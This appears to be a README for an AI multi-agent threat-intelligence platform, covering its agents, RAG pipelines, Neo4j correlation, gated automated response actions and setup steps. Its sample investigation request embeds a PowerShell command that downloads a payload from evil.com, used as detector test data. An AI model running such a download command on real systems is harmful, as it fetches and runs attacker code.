# Project Overview

## 1. Project Overview

**MedFlow AI Cybersecurity** is an agentic threat intelligence platform that transforms raw security telemetry into correlated, predictive threat intelligence reports using specialized AI agents. Instead of traditional SIEM rules, the system employs eight autonomous AI agents that analyze security events, extract indicators of compromise (IOCs), identify vulnerabilities, map them to MITRE ATT&CK techniques, correlate events into campaigns, predict attacker behavior, and generate actionable response recommendations.

**Problem Solved:** Traditional SIEM systems rely on static rules that generate alerts but lack contextual understanding, campaign correlation, and predictive capabilities. Security analysts spend significant time manually investigating alerts and connecting isolated events into coherent attack narratives.

**Primary Goal:** Automate the threat investigation process by using AI to:
- Normalize and enrich security telemetry
- Identify and score IOCs with context
- Identify relevant CVEs and vulnerabilities
- Map behaviors to MITRE ATT&CK techniques using RAG
- Correlate isolated events into attack campaigns
- Predict likely attacker next steps
- Generate comprehensive intelligence reports
- Recommend and execute automated response actions

**Key Innovation:** Multi-agent architecture where each agent specializes in a specific aspect of threat analysis, orchestrated through LangGraph for sequential processing with shared state management.

---

## 2. Tech Stack & Dependencies

### Core Languages & Frameworks
- **Python 3.10+**: Primary language
- **LangGraph 0.2.0+**: Agent orchestration and workflow management
- **LangChain 0.3.0+**: LLM integration framework
- **Flask 3.1.3+**: REST API server

### AI/ML Components
- **LangChain-Groq 0.2.0+**: Groq LLM integration
- **Groq 0.11.0+**: High-performance LLM API client
- **ChromaDB 0.5.23**: Vector database for RAG
- **Sentence-Transformers 3.0.0+**: Text embeddings (all-MiniLM-L6-v2)
- **Transformers 4.30.0-5.0.0**: Hugging Face transformers library
- **HuggingFace Hub 0.19.0-0.25.0**: Model repository access

### Databases
- **Neo4j 5.23.0+**: Graph database for knowledge graph and campaign correlation
- **ChromaDB 0.5.23**: Vector database for MITRE ATT&CK technique embeddings

### Data Processing
- **Pydantic 2.8.0+**: Data validation and models
- **Pandas 2.2.0+**: Data manipulation
- **NumPy 1.26.0+**: Numerical computing

### Security Telemetry Parsing
- **python-evtx 0.7.4**: Windows Sysmon EVTX parsing
- **evtx 0.1.0**: Alternative EVTX parser
- **scapy 2.6.0**: Network packet analysis (Zeek/Suricata support)

### Reporting & Templates
- **Jinja2 3.1.4+**: Template engine for reports
- **Markdown2 2.5.0+**: Markdown processing

### Configuration & Environment
- **python-dotenv 1.0.1+**: Environment variable management

### Testing
- **Pytest 8.3.0+**: Unit testing framework

---

## 3. Architecture & Folder Structure

### Design Patterns

**Multi-Agent Architecture**: Eight specialized agents each handle a specific aspect of threat analysis, coordinated through a LangGraph workflow.

**Orchestrator Pattern**: LangGraph manages agent execution order, state passing, and workflow control flow.

**State Management Pattern**: Shared TypedDict state object accumulates results through the workflow pipeline.

**RAG Pattern**: Retrieval-Augmented Generation for MITRE ATT&CK technique mapping and CVE vulnerability analysis using ChromaDB vector similarity search.

**Knowledge Graph Pattern**: Neo4j stores relationships between entities (hosts, users, IOCs, techniques) for campaign correlation.

**Connector Pattern**: Abstracted external API integrations (firewall, EDR, IAM) through connector functions.

**Policy Pattern**: Security policy engine evaluates action proposals against configurable rules before execution.

### Folder Structure

```
agentic-threat-intelligence/
├── app.py                          # Flask API entry point (POST /investigate)
├── config.py                       # Centralized configuration from environment variables
├── requirements.txt                # Python dependencies
├── .env.example                    # Environment variable template
├── .env                            # Actual environment variables (gitignored)
│
├── graph/                          # LangGraph orchestration layer
│   ├── workflow.py                 # Builds and compiles the agent workflow graph
│   ├── state.py                    # InvestigationState TypedDict (shared state)
│   └── nodes.py                    # Wrapper functions adapting agents to LangGraph nodes
│
├── agents/                         # Eight specialized AI agents
│   ├── collection_agent.py         # Normalizes raw telemetry into standard schema
│   ├── enrichment_agent.py         # Extracts and enriches IOCs with LLM scoring
│   ├── vulnerability_agent.py      # Identifies relevant CVEs using RAG
│   ├── attack_mapping_agent.py      # Maps events to MITRE ATT&CK techniques (RAG)
│   ├── correlation_agent.py        # Correlates events into campaigns
│   ├── prediction_agent.py         # Predicts attacker next moves
│   ├── reporting_agent.py          # Generates markdown intelligence reports
│   └── response_agent.py           # Generates and executes response actions
│
├── llm/                            # LLM integration layer
│   ├── groq_client.py              # Groq API wrapper (invoke_llm function)
│   ├── prompts.py                  # System prompts for all agents
│   └── output_parsers.py           # JSON extraction from LLM responses
│
├── rag/                            # RAG implementation for ATT&CK and CVE analysis
│   ├── ingest_attack.py            # MITRE ATT&CK data ingestion script
│   ├── ingest_cve.py               # CVE data ingestion script
│   ├── vector_store.py             # ChromaDB connection and operations
│   ├── embeddings.py               # Sentence transformer embeddings
│   ├── chunking.py                 # Text chunking for technique/CVE descriptions
│   ├── retriever.py                # ATT&CK vector similarity search
│   ├── cve_retriever.py            # CVE vector similarity search
│   └── attack_chain_retriever.py   # ATT&CK chain-specific retrieval
│
├── intelligence/                   # Core intelligence logic
│   ├── ioc_extractor.py            # Regex-based IOC extraction (IPs, hashes, URLs, domains)
│   ├── mitre_mapper.py             # ATT&CK technique ID mapping
│   ├── risk_scoring.py             # IOC and event risk scoring
│   ├── campaign_builder.py         # Campaign construction from correlated events
│   └── technique_predictor.py       # Next technique prediction logic
│
├── knowledge_graph/                # Neo4j knowledge graph
│   ├── graph_schema.py             # Neo4j node/relationship definitions
│   ├── graph_builder.py            # Builds graph from investigation results
│   └── graph_queries.py            # Common Cypher queries for analysis
│
├── databases/                      # Database connection managers
│   ├── neo4j_manager.py            # Neo4j driver and query runner
│   ├── chroma_manager.py           # ChromaDB connection manager
│   └── models.py                   # Data models for database entities
│
├── actions/                        # Automated response action system
│   ├── action_models.py            # Pydantic models for actions (ProposedAction, ActionResult)
│   ├── connectors.py               # External API integrations (firewall, EDR, IAM, Slack)
│   ├── policy.py                   # Security policy engine for action evaluation
│   ├── audit_log.py                # Immutable audit trail for all actions
│   └── review_pending.py          # Pending action review interface
│
├── memory/                         # Cross-run investigation memory
│   └── investigation_memory.py     # Persistent storage for investigation states
│
├── data/                           # Data storage
│   ├── attack_data/                # MITRE ATT&CK STIX data
│   ├── cve_data/                   # CVE vulnerability data
│   ├── chroma_store/               # ChromaDB vector database
│   ├── raw_logs/                   # Sample security telemetry (Sysmon, Suricata, Zeek)
│   ├── sample_events/              # Sample event JSON files
│   ├── threat_reports/             # Generated intelligence reports
│   └── investigation_memory.json   # Persistent investigation state storage
│
├── reports/                        # Report generation
│   └── (templates and generators)
│
├── tests/                          # Unit tests
│   └── (pytest test files)
│
├── docs/                           # Documentation
│   ├── architecture.md             # Detailed architecture documentation
│   ├── workflow.md                 # Workflow documentation
│   └── database_schema.md          # Database schema documentation
│
└── (additional utility scripts)
    ├── main.py                     # CLI entry point for local testing
    ├── investigation_service.py    # Service layer for investigation execution
    ├── simulation_runner.py        # Security simulation runner
    ├── convert_logs.py             # Log format conversion utility
    └── test_connectors.py          # Connector testing script
```

---

## 4. Core Functionalities

### 4.1 Telemetry Collection & Normalization

**Business Function:** Ingests raw security telemetry from various sources (Sysmon, Suricata, Zeek, Wazuh) and normalizes it into a consistent event schema for downstream analysis.

**Technical Implementation:**
- **Entry Point:** `app.py` POST `/investigate` endpoint accepts JSON event arrays
- **Agent:** `CollectionAgent` in `agents/collection_agent.py`
- **Process:** 
  - Batches events (20 per batch) to manage LLM context limits
  - Sends batches to Groq LLM with normalization prompt
  - LLM extracts and standardizes fields (timestamp, source_ip, process_name, etc.)
  - Assigns UUID event_id to each normalized event
- **LLM Prompt:** `COLLECTION_SYSTEM_PROMPT` in `llm/prompts.py`
- **Output:** Normalized event list with consistent schema

### 4.2 IOC Extraction & Enrichment

**Business Function:** Identifies indicators of compromise (IPs, hashes, URLs, domains) from events and enriches them with threat intelligence context and confidence scores.

**Technical Implementation:**
- **Agent:** `EnrichmentAgent` in `agents/enrichment_agent.py`
- **Extraction:** `extract_iocs()` in `intelligence/ioc_extractor.py` uses regex patterns for:
  - IP addresses (IPv4)
  - File hashes (MD5, SHA1, SHA256)
  - URLs (http/https)
  - Domain names
- **Enrichment:** Sends extracted IOCs to Groq LLM with enrichment prompt
- **LLM Prompt:** `ENRICHMENT_SYSTEM_PROMPT` in `llm/prompts.py`
- **Scoring:** LLM assigns verdict (benign/suspicious/malicious) and confidence (0.0-1.0)
- **Output:** Enriched IOC list with verdict, confidence, and justification

### 4.3 Vulnerability Analysis (CVE RAG)

**Business Function:** Identifies relevant CVE (Common Vulnerabilities and Exposures) entries based on software context extracted from security events, providing vulnerability intelligence alongside threat analysis.

**Technical Implementation:**
- **Agent:** `VulnerabilityAgent` in `agents/vulnerability_agent.py`
- **RAG Pipeline:**
  1. **Ingestion:** `rag/ingest_cve.py` loads CVE data from JSON files
  2. **Chunking:** Splits CVE descriptions into chunks
  3. **Embedding:** Creates sentence-transformer embeddings
  4. **Storage:** `rag/vector_store.py` stores in ChromaDB `cve_database` collection
  5. **Retrieval:** `rag/cve_retriever.py` performs vector similarity search
- **Process:**
  - Extracts software context from events (process names, command lines, file paths)
  - Queries ChromaDB for relevant CVEs based on software names
  - LLM analyzes and filters CVEs for relevance
  - Returns CVEs with CVSS scores, severity, and justification
- **LLM Prompt:** `VULNERABILITY_SYSTEM_PROMPT` in `llm/prompts.py`
- **Output:** Vulnerability list with cve_id, cvss_score, severity, confidence, and affected_software

### 4.4 MITRE ATT&CK Technique Mapping (RAG)

**Business Function:** Maps security events to MITRE ATT&CK technique IDs using semantic similarity search against the MITRE ATT&CK knowledge base.

**Technical Implementation:**
- **Agent:** `AttackMappingAgent` in `agents/attack_mapping_agent.py`
- **RAG Pipeline:**
  1. **Ingestion:** `rag/ingest_attack.py` loads MITRE ATT&CK STIX data
  2. **Chunking:** `rag/chunking.py` splits technique descriptions into chunks
  3. **Embedding:** `rag/embeddings.py` creates sentence-transformer embeddings
  4. **Storage:** `rag/vector_store.py` stores in ChromaDB
  5. **Retrieval:** `rag/retriever.py` performs vector similarity search
- **Process:**
  - Converts events to text representation
  - Queries ChromaDB for similar ATT&CK technique chunks
  - LLM analyzes matches and assigns technique IDs with confidence
- **LLM Prompt:** `MAPPING_SYSTEM_PROMPT` in `llm/prompts.py`
- **Output:** Technique list with technique_id, name, confidence, and evidence

### 4.5 Campaign Correlation

**Business Function:** Groups isolated security events into coherent attack campaigns by analyzing shared IOCs, techniques, hosts, and temporal patterns.

**Technical Implementation:**
- **Agent:** `CorrelationAgent` in `agents/correlation_agent.py`
- **Logic:** `campaign_builder.py` correlates events based on:
  - Shared IOCs (same malicious IP/domain)
  - Shared techniques (same ATT&CK technique)
  - Shared hosts (same hostname)
  - Temporal proximity (events within time window)
- **Knowledge Graph:** Uses Neo4j to store entity relationships:
  - Nodes: Hosts, Users, IOCs, Techniques
  - Relationships: CONNECTED_TO, USED_BY, RELATED_TO
- **Output:** Campaign object with campaign_id, name, timeline, and related_techniques

### 4.6 Threat Prediction

**Business Function:** Predicts the attacker's likely next steps based on current techniques and MITRE ATT&CK attack chain patterns.

**Technical Implementation:**
- **Agent:** `PredictionAgent` in `agents/prediction_agent.py`
- **Logic:** `technique_predictor.py` uses:
  - Current detected techniques
  - MITRE ATT&CK attack chain relationships
  - Historical campaign patterns
- **Process:**
  - Analyzes current technique sequence
  - Queries ATT&CK data for common next steps
  - LLM generates prediction with confidence scores
- **LLM Prompt:** `PREDICTION_SYSTEM_PROMPT` in `llm/prompts.py`
- **Output:** Prediction object with likely_next_techniques and rationale

### 4.7 Intelligence Reporting

**Business Function:** Generates comprehensive, human-readable markdown intelligence reports summarizing the investigation findings, campaign analysis, and recommended actions.

**Technical Implementation:**
- **Agent:** `ReportingAgent` in `agents/reporting_agent.py`
- **Template:** Uses Jinja2 templates for structured reports
- **Content:** Includes:
  - Executive summary
  - Timeline of events
  - IOC analysis
  - MITRE ATT&CK mapping
  - Campaign narrative
  - Threat predictions
  - Response recommendations
- **LLM Prompt:** `REPORTING_SYSTEM_PROMPT` in `llm/prompts.py`
- **Output:** Markdown report string stored in state

### 4.8 Automated Response Actions

**Business Function:** Generates and executes automated security response actions (block IPs, isolate hosts, disable accounts, etc.) based on threat intelligence and configurable security policies.

**Technical Implementation:**
- **Agent:** `ResponseAgent` in `agents/response_agent.py`
- **Action Generation:**
  - LLM generates action proposals based on campaign, techniques, and IOCs
  - Fallback mechanism generates IOC-based actions if LLM fails
- **Policy Engine:** `actions/policy.py` evaluates actions against:
  - Global kill switch (AUTO_RESPONSE_ENABLED)
  - Protected targets (critical systems)
  - Confidence thresholds (MIN_AUTO_EXECUTE_CONFIDENCE = 0.70)
  - Rate limiting (max 3 actions per target per hour)
- **Connectors:** `actions/connectors.py` provides API integrations:
  - `block_ip()`: Firewall API (Palo Alto, Fortinet, AWS Security Groups)
  - `isolate_host()`: Wazuh EDR API
  - `disable_account()`: Azure AD/Entra ID or Okta IAM
  - `kill_process()`: Wazuh EDR API
  - `quarantine_file()`: CrowdStrike, SentinelOne, or Wazuh EDR
  - `notify_analyst()`: Slack webhook
- **Audit Logging:** `actions/audit_log.py` maintains immutable audit trail
- **Safety:** DRY_RUN mode logs actions without real API calls
- **Output:** ActionResult list with status (executed/pending_approval/denied)

### 4.9 REST API Interface

**Business Function:** Provides HTTP API for submitting security events and receiving investigation results.

**Technical Implementation:**
- **File:** `app.py` Flask application
- **Endpoints:**
  - `GET /`: Health check
  - `POST /investigate`: Main investigation endpoint
- **Input:** JSON array of events or object with "events" array
- **Output:** JSON object with:
  - campaign: Campaign analysis
  - techniques: ATT&CK mapping
  - iocs: Enriched indicators
  - vulnerabilities: CVE analysis
  - prediction: Threat predictions
  - report: Markdown intelligence report
  - actions_taken: Response action results
  - raw_events: Original input events
- **Error Handling:** Comprehensive error handling with logging
- **CORS:** Enabled for cross-origin requests

---

## 5. Data Flow & State

### Investigation Workflow Data Flow

```
1. HTTP Request (POST /investigate)
   ↓
2. Raw Events → InvestigationState.raw_events
   ↓
3. Collection Agent
   - Normalizes events
   - Updates InvestigationState.events
   ↓
4. Enrichment Agent
   - Extracts IOCs from events
   - Enriches with LLM scoring
   - Updates InvestigationState.iocs
   ↓
5. Vulnerability Agent
   - Extracts software context
   - Retrieves relevant CVEs (RAG)
   - Updates InvestigationState.vulnerabilities
   ↓
6. Attack Mapping Agent
   - Maps events to ATT&CK techniques (RAG)
   - Updates InvestigationState.techniques
   ↓
7. Correlation Agent
   - Correlates events into campaigns
   - Updates InvestigationState.campaign
   - Writes to Neo4j knowledge graph
   ↓
8. Prediction Agent
   - Predicts next techniques
   - Updates InvestigationState.prediction
   ↓
9. Reporting Agent
   - Generates markdown report
   - Updates InvestigationState.report
   ↓
10. Response Agent
   - Generates and executes actions
   - Updates InvestigationState.actions_taken
   ↓
11. Final State → JSON Response
   ↓
12. Investigation Memory (persistent storage)
```

### State Management

**InvestigationState** (TypedDict in `graph/state.py`):
- `raw_events`: Input telemetry
- `events`: Normalized events
- `iocs`: Enriched indicators
- `vulnerabilities`: CVE analysis results
- `techniques`: ATT&CK mappings
- `campaign`: Correlated campaign
- `prediction`: Threat predictions
- `report`: Markdown report
- `actions_taken`: Response action results
- `errors`: Non-fatal errors
- `metadata`: Run metadata

**State Passing:** LangGraph automatically passes state between nodes, with each node returning a partial state update that merges into the shared state object.

### Database Interactions

**ChromaDB (RAG):**
- **Purpose:** Store MITRE ATT&CK technique and CVE embeddings
- **Operations:** Vector similarity search during technique mapping and vulnerability analysis
- **Connection:** `rag/vector_store.py` manages ChromaDB client
- **Collections:**
  - `attack_techniques`: MITRE ATT&CK technique description chunks
  - `cve_database`: CVE description chunks for vulnerability analysis

**Neo4j (Knowledge Graph):**
- **Purpose:** Store entity relationships for campaign correlation
- **Operations:** Create nodes/relationships, run Cypher queries
- **Connection:** `databases/neo4j_manager.py` manages Neo4j driver
- **Schema:** Hosts, Users, IOCs, Techniques with relationships
- **Usage:** Correlation agent writes, analysts query

**Investigation Memory:**
- **Purpose:** Persistent storage of investigation states
- **Format:** JSON file (`data/investigation_memory.json`)
- **Operations:** Append new investigation results
- **Usage:** Historical analysis and debugging

### External API Interactions

**Groq LLM API:**
- **Purpose:** AI inference for all agents
- **Usage:** Multiple calls per investigation (one per agent)
- **Client:** `llm/groq_client.py` wrapper
- **Rate Limiting:** Built-in retry logic for 429 errors

**Connector APIs (Optional):**
- **Firewall:** Block IP addresses
- **Wazuh EDR:** Isolate hosts, kill processes
- **Azure AD/Okta:** Disable user accounts
- **CrowdStrike/SentinelOne:** Quarantine files
- **Slack:** Send notifications
- **Usage:** Only when response actions enabled and DRY_RUN=false

---

## 6. Getting Started

### Prerequisites

- Python 3.10 or higher
- Docker (for Neo4j container)
- Groq API key (https://console.groq.com/keys)
- Git

### Installation Steps

1. **Clone the Repository:**
   ```bash
   cd /path/to/workspace
   git clone <repository-url>
   cd MedFlow_AI_Cybersecurity/week2/agentic-threat-intelligence
   ```

2. **Create Virtual Environment:**
   ```bash
   python3 -m venv .venv
   source .venv/bin/activate
   ```

3. **Install Dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

4. **Configure Environment Variables:**
   ```bash
   cp .env.example .env
   nano .env
   ```
   
   Required variables:
   ```env
   GROQ_API_KEY=your_groq_api_key_here
   NEO4J_URI=bolt://localhost:7687
   NEO4J_USER=neo4j
   NEO4J_PASSWORD=changeme
   ```

5. **Start Neo4j Database:**
   ```bash
   docker run -d --name neo4j-threat-intel \
     -p 7474:7474 -p 7687:7687 \
     -e NEO4J_AUTH=neo4j/changeme \
     neo4j:5.23
   ```

6. **Download MITRE ATT&CK Data:**
   ```bash
   mkdir -p data/attack_data
   curl -L -o data/attack_data/enterprise_attack.json \
     https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json
   ```

7. **Ingest ATT&CK Data into ChromaDB:**
   ```bash
   python -m rag.ingest_attack
   ```

8. **Ingest CVE Data into ChromaDB:**
   ```bash
   python -m rag.ingest_cve
   ```

9. **Start the Flask Server:**
   ```bash
   python app.py
   ```

   Server will start on `http://0.0.0.0:5000`

### Testing the Installation

1. **Health Check:**
   ```bash
   curl http://localhost:5000/
   ```
   Expected: `{"status": "running"}`

2. **Sample Investigation:**
   ```bash
   curl -X POST http://localhost:5000/investigate \
     -H "Content-Type: application/json" \
     -d '{
       "events": [{
         "timestamp": "2025-07-03T10:00:00Z",
         "source_ip": "185.220.101.45",
         "destination_ip": "192.168.1.28",
         "event_type": "network_connection",
         "process_name": "powershell.exe",
         "user": "Administrator",
         "command_line": "powershell Invoke-WebRequest http://evil.com/payload.exe",
         "hostname": "target-node2"
       }]
     }'
   ```

### Optional: Enable Automated Response Actions

To enable automated response actions (in dry-run mode first):

1. **Edit `.env`:**
   ```env
   AUTO_RESPONSE_ENABLED=true
   DRY_RUN=true
   ```

2. **Add placeholder connector credentials** (for validation):
   ```env
   SLACK_WEBHOOK_URL=https://hooks.slack.com/services/PLACEHOLDER
   FIREWALL_API_URL=https://firewall-placeholder.com/api
   FIREWALL_API_TOKEN=placeholder_token
   WAZUH_API_URL=https://wazuh-placeholder.com
   WAZUH_USERNAME=placeholder_user
   WAZUH_PASSWORD=placeholder_password
   ```

3. **Restart Server:**
   ```bash
   pkill -f "python app.py"
   python app.py
   ```

### Troubleshooting

**ImportError with huggingface_hub:**
```bash
pip install 'huggingface_hub>=0.19.0,<0.25.0' 'transformers>=4.30.0,<5.0.0'
```

**ChromaDB version issues:**
```bash
pip install chromadb==0.5.23
```

**Neo4j connection failed:**
- Ensure Docker container is running: `docker ps`
- Check Neo4j logs: `docker logs neo4j-threat-intel`
- Verify URI in `.env` matches container port mapping

**Groq API errors:**
- Verify API key is valid: `https://console.groq.com/keys`
- Check for rate limiting (built-in retry handles 429 errors)

### Development Workflow

**Run local investigation (CLI):**
```bash
python main.py
```

**Test specific agent:**
```bash
python test_response_agent.py
```

**Run unit tests:**
```bash
pytest tests/
```

**View investigation memory:**
```bash
cat data/investigation_memory.json | jq
```

**Check audit logs:**
```bash
cat data/action_audit_log.jsonl | jq
```

### Production Deployment Considerations

- Use production WSGI server (Gunicorn/uWSGI) instead of Flask development server
- Configure proper logging and monitoring
- Set up SSL/TLS for HTTPS
- Configure real connector credentials for response actions
- Set `DRY_RUN=false` only after thorough testing
- Implement proper authentication/authorization for API endpoints
- Set up backup and disaster recovery for databases
- Configure rate limiting for API endpoints
- Implement proper secrets management (not .env files)

---
